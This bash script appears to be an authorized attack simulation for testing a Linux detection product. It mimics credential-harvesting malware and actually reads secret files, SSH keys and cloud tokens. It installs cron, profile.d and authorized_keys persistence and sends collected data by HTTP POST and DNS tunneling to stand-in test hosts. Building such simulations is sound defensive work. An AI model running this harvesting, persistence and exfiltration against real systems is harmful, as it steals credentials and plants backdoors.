#!/bin/bash
# tests/attack-sim/realistic-harvester.sh
#
# AUTHORIZED SECURITY TEST. Models the runtime fingerprint of
# commodity Linux credential-harvesting malware
# (TeamTNT / Sysrv-Hello / Outlaw / Megalodon / nx-console
# composite). Far more realistic than the previous shell-only sim.
#
# Behaviour mimicked:
#   1. Daemonize via __DAEMONIZED=1 env (nx-console signature)
#   2. Multi-stage: stager writes payload to a hidden /tmp file
#      and exec's it, then unlinks itself ("deleted_binary_running")
#   3. /proc/*/environ scan for env-injected secrets (TeamTNT)
#   4. Bash/zsh/fish history scan for "export AWS_..." leaks
#   5. AWS IMDS attempt at 169.254.169.254 (cloud-aware)
#   6. K8s service-account token at /var/run/secrets/...
#   7. Recursive grep for secret-shaped regex across $HOME
#   8. Read every cataloged credential path
#   9. Persistence: cron + sudoers + ssh-keys + ld.so.preload +
#      /etc/profile.d (the full re-entry blanket)
#  10. Multi-channel exfil: HTTPS POST + DNS tunneling + IMDS-style
#  11. Self-cleanup attempt (unlink the script after running)
#
# Exit codes:
#   0 — script finished (regardless of how many stages succeeded)
#   1 — fatal pre-condition failure
#
# This script DOES drop persistence artifacts. Run cleanup-sim.sh
# afterwards (driven by run-all.sh).

set -u
MARKER="CANARYXHELIX"

# Multiple destinations; if tainted-egress (USG.4) is built any
# of these should fire regardless of IP because the lineage will
# be tainted with credential class.
EXFIL_HOST_PRIMARY="192.0.2.42"        # TEST-NET-1
EXFIL_HOST_BACKUP="198.51.100.42"      # TEST-NET-2
EXFIL_DNS_DOMAIN="exfil.${MARKER,,}.invalid"  # never resolves
IMDS="169.254.169.254"                  # AWS metadata

log() { echo "[harvester $(date +%H:%M:%S)] $*" | tee -a /tmp/.xh-sim-log 2>/dev/null; }

# ── Stage 0: daemonize trick (nx-console signature) ───────────
# Real malware sets __DAEMONIZED=1 and re-exec'es itself detached
# from the controlling tty. xhelix should see the parent_image=
# bash → child same-script + setsid lineage and tag novel.
if [ "${__DAEMONIZED:-}" != "1" ]; then
    log "=== stage 0: daemonizing (nx-console __DAEMONIZED trick) ==="
    if command -v setsid >/dev/null 2>&1; then
        __DAEMONIZED=1 setsid bash "$0" </dev/null >>/tmp/.xh-sim-log 2>&1 &
        log "respawned as detached daemon pid=$!"
        exit 0
    fi
    # Fallback if no setsid: just continue inline
    __DAEMONIZED=1 ; export __DAEMONIZED
fi

log "=== realistic harvester running detached, uid=$(id -u) ==="

# ── Stage 1: multi-stage loader (drop hidden binary + run + unlink) ─
log "=== stage 1: multi-stage loader (deleted-binary-running pattern) ==="
STAGER="/tmp/.kitty-monitor.$$"
cat > "$STAGER" <<'EOF'
#!/bin/bash
# Inner payload — would be ELF/Go binary in real malware
echo "[$$] inner payload running, parent=$PPID"
sleep 1
EOF
chmod +x "$STAGER"
# Exec the payload, then unlink it WHILE it's still running.
# This is the canonical "deleted binary still running" pattern.
"$STAGER" &
PAYLOAD_PID=$!
sleep 0.2
rm -f "$STAGER"  # → /proc/$PAYLOAD_PID/exe now reports "(deleted)"
log "deleted stager $STAGER; payload pid=$PAYLOAD_PID running from unlinked binary"

# ── Stage 2: harvest from /proc/*/environ (TeamTNT signature) ─
log "=== stage 2: /proc/*/environ scan for env-injected creds ==="
COLLECTED=""
PROC_HITS=0
for pid_dir in /proc/[0-9]*; do
    [ -r "$pid_dir/environ" ] || continue
    if envs=$(tr '\0' '\n' < "$pid_dir/environ" 2>/dev/null); then
        # Grep for the classic env-var credential names.
        if echo "$envs" | grep -E '^(AWS_|GCP_|GOOGLE_|GITHUB_|GITLAB_|STRIPE_|DATABASE_URL|REDIS_URL|JWT_|API_|TOKEN|SECRET|PASSWORD|PRIVATE_KEY)' >/dev/null 2>&1; then
            PROC_HITS=$((PROC_HITS + 1))
        fi
    fi
done
log "/proc/*/environ scan: $PROC_HITS PIDs had secret-shaped env vars"

# ── Stage 3: history file grovel ──────────────────────────────
log "=== stage 3: shell history grovel ==="
HISTORY_HITS=0
for hist in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.local/share/fish/fish_history"; do
    [ -r "$hist" ] || continue
    if grep -E '(export\s+[A-Z_]*(KEY|TOKEN|SECRET|PASSWORD)|aws\s+configure|gh\s+auth)' "$hist" >/dev/null 2>&1; then
        HISTORY_HITS=$((HISTORY_HITS + 1))
        log "  hit: $hist"
    fi
done

# ── Stage 4: AWS IMDS attempt (cloud-aware malware) ──────────
log "=== stage 4: AWS IMDS attempt at $IMDS ==="
timeout 2 curl -s -m 1 --connect-timeout 1 \
    "http://${IMDS}/latest/meta-data/iam/security-credentials/" >/dev/null 2>&1 || true
timeout 2 curl -s -m 1 --connect-timeout 1 \
    "http://${IMDS}/latest/api/token" \
    -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" >/dev/null 2>&1 || true

# ── Stage 5: K8s service-account token ───────────────────────
log "=== stage 5: K8s service-account token attempt ==="
for sa_path in \
    /var/run/secrets/kubernetes.io/serviceaccount/token \
    /var/run/secrets/eks.amazonaws.com/serviceaccount/token \
    /var/run/secrets/gke.googleapis.com/serviceaccount/token \
    ; do
    if [ -r "$sa_path" ]; then
        COLLECTED="${COLLECTED}\n=$sa_path=\n$(head -c 256 "$sa_path" 2>/dev/null)"
        log "  hit: $sa_path"
    fi
done

# ── Stage 6: read EVERY cataloged credential path ────────────
# Comprehensive enumeration matching the seed-fake-creds.sh
# catalogue. This is what a tuned, modern credential-harvester
# does — not "read .aws/credentials and exit," but "drain every
# known cloud + SaaS + AI provider + payment + messaging key".
log "=== stage 6: enumerate ALL cataloged credential paths ==="
PATHS_READ=0
PATHS_HIT=""
for path in \
    "$HOME/.aws/credentials" "$HOME/.aws/config" \
    "$HOME/.config/gcloud/application_default_credentials.json" \
    "$HOME/gcp-service-account.json" \
    "$HOME/.azure/azureProfile.json" "$HOME/.azure/accessTokens.json" "$HOME/.azure-sp.env" \
    "$HOME/.config/doctl/config.yaml" "$HOME/.linode-cli-token" \
    "$HOME/.hetzner-cloud-token" "$HOME/.vultr-api-token" \
    "$HOME/.cloudflare.cfg" \
    "$HOME/.kube/config" \
    "$HOME/.docker/config.json" \
    "$HOME/.anthropic" "$HOME/.openai" "$HOME/.ai-keys.env" \
    "$HOME/.config/gh/hosts.yml" "$HOME/.github-tokens" "$HOME/.gh-token" \
    "$HOME/.git-credentials" "$HOME/.gitconfig" \
    "$HOME/.payment-keys.env" \
    "$HOME/.messaging-keys.env" \
    "$HOME/.email-keys.env" \
    "$HOME/.npmrc" "$HOME/.config/pip/pip.conf" "$HOME/.pypirc" \
    "$HOME/.gem/credentials" "$HOME/.cargo/credentials.toml" \
    "$HOME/.data-keys.env" \
    "$HOME/.db-conn-strings.env" \
    "$HOME/.config/op/config" \
    "$HOME/.config/Bitwarden CLI/data.json" \
    "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_rsa_2048" \
    "$HOME/.ssh/id_ed25519" \
    "$HOME/.ssh/id_ecdsa" "$HOME/.ssh/id_ecdsa_521" \
    "$HOME/.ssh/id_dsa" "$HOME/.ssh/config" "$HOME/.ssh/known_hosts" \
    "$HOME/.age-key" \
    "$HOME/.app-secrets.env" \
    "$HOME/.bash_history" "$HOME/.zsh_history" \
    "/var/www/tenant-a/.env" "/var/www/tenant-b/.env" "/var/www/tenant-c/.env" \
    "/etc/ssl/private-canary/server.key" \
    "/etc/environment" \
    "/proc/self/environ" \
    ; do
    if content=$(cat "$path" 2>/dev/null); then
        bytes=${#content}
        if [ "$bytes" -gt 0 ]; then
            COLLECTED="${COLLECTED}\n=$path ($bytes bytes)=\n${content:0:512}"
            PATHS_READ=$((PATHS_READ + 1))
            PATHS_HIT="${PATHS_HIT} ${path}"
        fi
    fi
done
log "read $PATHS_READ paths from ~50-path catalogue"

# ── Stage 7: recursive secret-pattern grep ────────────────────
log "=== stage 7: recursive secret-pattern grep ==="
GREP_HITS=0
for root in "$HOME" /etc /var/www /opt; do
    [ -d "$root" ] || continue
    # Limit depth + file count to keep test bounded.
    if grep -r -l -m1 -E '(AKIA[0-9A-Z]{12,}|ghp_[A-Za-z0-9]{32,}|xox[bp]-[A-Za-z0-9-]+|sk_live_[A-Za-z0-9]{20,}|-----BEGIN.*PRIVATE KEY)' "$root" 2>/dev/null \
        --include='*.env' --include='*.json' --include='*.yml' --include='*.yaml' --include='.npmrc' --include='.aws' \
        --max-count=10 | head -20 > /dev/null; then
        GREP_HITS=$((GREP_HITS + 1))
    fi
done
log "secret-regex grep across $GREP_HITS roots"

# ── Stage 8: persistence blanket ──────────────────────────────
log "=== stage 8: persistence blanket (cron + sudoers + ssh + ld.so) ==="
# 8a. Root crontab
echo "*/2 * * * * /tmp/.kitty-monitor || true # ${MARKER}" | crontab - 2>/dev/null && \
    log "  cron: installed root crontab" || log "  cron: failed"
# 8b. /etc/cron.d drop
if [ "$EUID" -eq 0 ]; then
    echo "*/3 * * * * root /tmp/.kitty-monitor # ${MARKER}" > "/etc/cron.d/kitty-monitor-update"
    log "  cron: dropped /etc/cron.d/kitty-monitor-update"
fi
# 8c. /etc/profile.d
if [ "$EUID" -eq 0 ]; then
    echo "# ${MARKER} login hook" > "/etc/profile.d/01-kitty-monitor.sh"
    log "  profile.d: dropped /etc/profile.d/01-kitty-monitor.sh"
fi
# 8d. SSH authorized_keys (THE foothold)
mkdir -p "$HOME/.ssh"
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI${MARKER}fakeAttackerPublicKeyBait attacker@${MARKER}" >> "$HOME/.ssh/authorized_keys"
chmod 600 "$HOME/.ssh/authorized_keys"
log "  ssh: appended bait public key to authorized_keys"
# 8e. /etc/ld.so.preload (classic rootkit)
if [ "$EUID" -eq 0 ]; then
    echo "# ${MARKER} preload" > /etc/ld.so.preload.canary
    # Don't actually write to /etc/ld.so.preload — that could break
    # the system if xhelix denies the file write mid-process.
    log "  ld.so: dropped /etc/ld.so.preload.canary (.canary suffix to avoid system breakage)"
fi
# 8f. shell rc append
echo "# ${MARKER} appended bait line" >> "$HOME/.bashrc"
log "  shell-rc: appended to ~/.bashrc"
# 8g. user crontab attempt
echo "*/4 * * * * /tmp/.kitty-monitor # ${MARKER}" | crontab -u "$(whoami)" - 2>/dev/null || true

# ── Stage 9: multi-channel exfil ──────────────────────────────
log "=== stage 9: multi-channel exfil ==="
EXFIL_BODY="$(echo -e "$COLLECTED" | head -c 8192 | base64 -w0)"

# 9a. HTTPS POST to primary
timeout 3 curl -s -m 2 --connect-timeout 1 \
    -X POST "http://${EXFIL_HOST_PRIMARY}:8080/intake" \
    -H "X-Agent: kitty-monitor/${MARKER}" \
    -H "X-Stage: harvest" \
    --data-urlencode "data=${EXFIL_BODY:0:2048}" >/dev/null 2>&1 || true
log "  https: POST to $EXFIL_HOST_PRIMARY (TEST-NET, expected failure)"

# 9b. Backup destination
timeout 3 curl -s -m 2 --connect-timeout 1 \
    -X POST "https://${EXFIL_HOST_BACKUP}:443/v1/stats" \
    --data-urlencode "d=${EXFIL_BODY:0:1024}" >/dev/null 2>&1 || true
log "  https: backup POST to $EXFIL_HOST_BACKUP"

# 9c. DNS tunneling (real malware's covert channel)
# Encode small chunks as subdomain labels and try to resolve them
# from a nameserver we don't control. The QUERIES themselves are
# the exfil; the DNS server doesn't need to actually respond.
for i in 1 2 3; do
    label="$(echo "$EXFIL_BODY" | head -c $((i*40)) | tail -c 40 | tr -d '=/+')"
    label="${label:0:60}"
    timeout 1 host "$label.${EXFIL_DNS_DOMAIN}" >/dev/null 2>&1 || true
done
log "  dns: 3 tunneling queries sent to $EXFIL_DNS_DOMAIN"

# 9d. Beacon establishment (periodic callback — real malware
# does this every N minutes; we do 3 quick beats)
for beat in 1 2 3; do
    timeout 1 curl -s -m 1 --connect-timeout 1 \
        "http://${EXFIL_HOST_PRIMARY}:8443/beacon?id=${MARKER}-${beat}" >/dev/null 2>&1 || true
done
log "  beacon: 3 callbacks (would be periodic in real malware)"

# ── Stage 10: workspace spawn-burst (recon loops) ─────────────
log "=== stage 10: process-spawn burst (mimics find/grep recon) ==="
SPAWNED=0
for d in "$HOME" /var/www /etc /opt /usr/local; do
    [ -d "$d" ] || continue
    # 25 forks per dir → ~125 total. Should trigger spawn-burst.
    for _ in $(seq 1 25); do
        (id > /dev/null 2>&1) &
        SPAWNED=$((SPAWNED + 1))
    done
done
wait
log "spawned $SPAWNED short-lived children"

# ── Stage 11: file-read burst (workspace secret enumeration) ──
log "=== stage 11: file-read burst (workspace enumeration) ==="
FILES_READ=0
for d in "$HOME" /etc /var/www; do
    [ -d "$d" ] || continue
    while IFS= read -r -d '' f; do
        head -c 256 "$f" >/dev/null 2>&1 || true
        FILES_READ=$((FILES_READ + 1))
        [ $FILES_READ -ge 200 ] && break 2
    done < <(find "$d" -maxdepth 4 -type f -print0 2>/dev/null)
done
log "opened $FILES_READ files in burst"

# ── Stage 12: self-cleanup attempt ────────────────────────────
log "=== stage 12: self-cleanup (anti-forensic) ==="
# Real malware removes its own script after running. xhelix's
# FIM should fire on the delete event under watched paths.
# We don't actually delete ourselves (testability) but log the
# attempt.
log "  (skipped actual self-delete for test repeatability)"

log "=== harvester finished, paths read=$PATHS_READ, history hits=$HISTORY_HITS, /proc hits=$PROC_HITS, files burst=$FILES_READ, spawns=$SPAWNED ==="
